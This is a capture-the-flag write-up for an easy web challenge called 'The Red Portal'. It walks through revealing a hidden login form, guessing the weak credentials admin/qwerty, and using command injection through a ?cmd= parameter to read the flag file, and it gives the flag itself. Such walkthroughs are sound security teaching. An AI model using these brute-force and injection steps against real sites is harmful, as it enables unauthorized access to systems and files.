## 🔍 Challenge: **THE RED PORTAL**

**Author:** Rabia
**Difficulty:** Easy
**Flag:** `ACM{cmd_injection}`
**Description:**

> *The surface smiles, but the shadows speak. Will you listen?*

---

### 🧠 Challenge Overview:

In *"The Red Portal"*, you're presented with a minimal or empty page, but something is lurking just out of sight. The challenge involves uncovering a hidden login form, bypassing it using a dictionary attack, and exploiting a command injection vulnerability to retrieve the flag.

---

### 🛠️ Step-by-Step Walkthrough:

#### 🔎 Step 1: View Source – Uncover the Hidden Login

On first load, the webpage looks very simple. But viewing the source (`Ctrl+U`) reveals an important clue:


```html
<div id="login" class="login-container" style="display: none;"></div>
```

The `login` container is present in the DOM but hidden with `style="display: none;"`.


➡️ Using browser dev tools (`F12`), remove or modify the inline style to reveal the hidden login form. (e.g., change `display: none;` to `display: block;`).

---

#### 🔐 Step 2: Brute-Force the Login Page

The login form has two fields: `username` and `password`. With no rate-limiting, it’s vulnerable to a dictionary attack.

Using a simple wordlist or trial and error:

* **Username:** `admin`
* **Password:** `qwerty`

Logs you in successfully and redirects to a new page — typically a **blog** or **portal page**.

---

#### 💥 Step 3: Exploit Command Injection

Once logged in, observe the URL:

```
portal.com/blog
```

Trying a basic command injection like:

```
?cmd=ls
```

Returns a list of files:

```
index.html
portal.txt
notes.txt
```

This is a sign of **command injection** — the value of `cmd` is being passed to a system shell.

To retrieve the flag:

```
?cmd=cat portal.txt
```

You’ll see:

```
ACM{cmd_injection}
```

✅ Success!

---

### 🏁 Final Flag:

```
ACM{cmd_injection}
```
